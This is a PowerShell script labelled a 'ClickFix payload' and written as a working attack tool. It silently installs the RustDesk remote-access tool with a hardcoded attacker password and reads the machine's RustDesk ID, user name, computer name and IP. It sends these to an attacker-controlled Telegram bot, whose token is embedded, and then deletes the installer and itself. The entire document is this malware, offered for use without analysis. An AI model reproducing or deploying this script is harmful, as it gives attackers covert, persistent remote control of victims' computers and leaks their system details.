# s.ps1 - RustDesk ClickFix Payload
# This script installs RustDesk silently, sets the password, 
# establishes persistence, and exfiltrates the ID to Telegram.

# 1. Attacker Credentials
$pw = "AttackerSecret123!"
$token = "8800944118:AAH5fH76MZUomwJZVEuFHPIf0X3tgAJ25mM"
$chatId = "2030209395"

# 2. Download Official Installer
$url = "https://github.com/rustdesk/rustdesk/releases/latest/download/RustDeskSetup-x86_64.exe"
$f = Join-Path $env:TEMP "rd_setup.exe"

Write-Verbose "Downloading RustDesk installer to $f..."
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile($url, $f)
} catch {
    Write-Error "Failed to download RustDesk installer: $_"
    exit 1
}

# 3. Install Silently with Hardcoded Password
# /S = Silent
# /RUSTDESK_PASSWORD = Sets the permanent password for unattended access
Start-Process $f -ArgumentList "/S /RUSTDESK_PASSWORD=$pw" -Wait

# 4. Clean Up Installer
Remove-Item $f -Force -ErrorAction SilentlyContinue

# 5. Ensure Service is Running
Start-Service RustDesk -ErrorAction SilentlyContinue

# 6. Retrieve RustDesk ID
# Wait 3 seconds to ensure the service is fully initialized
Start-Sleep -Seconds 3
$RustDeskId = & "C:\Program Files\RustDesk\rustdesk.exe" --get-id 2>$null

# 7. Exfiltrate ID to Telegram
$SystemInfo = @{
    ComputerName = $env:COMPUTERNAME
    UserName     = $env:USERNAME
    OS           = (Get-WmiObject Win32_OperatingSystem).Caption
    IP           = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
    Timestamp    = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
}

$TelegramMessage = @"
🚨 <b>New RustDesk Session Established</b>

🆔 <b>ID:</b> $RustDeskId
🔑 <b>Password:</b> $pw
💻 <b>Computer:</b> $env:COMPUTERNAME
👤 <b>User:</b> $env:USERNAME
🌐 <b>IP:</b> $($SystemInfo.IP)
📅 <b>Time:</b> $($SystemInfo.Timestamp)
"@

$TelegramPayload = @{
    chat_id                = $chatId
    text                   = $TelegramMessage
    parse_mode             = "HTML"
    disable_web_page_preview = $true
} | ConvertTo-Json

try {
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
                      -Method Post `
                      -Body $TelegramPayload `
                      -ContentType "application/json" `
                      -TimeoutSec 10
    Write-Verbose "Telegram notification sent successfully."
} catch {
    Write-Verbose "Telegram notification failed: $_"
}

# 8. Final Cleanup
if ($MyInvocation.MyCommand.Path) {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}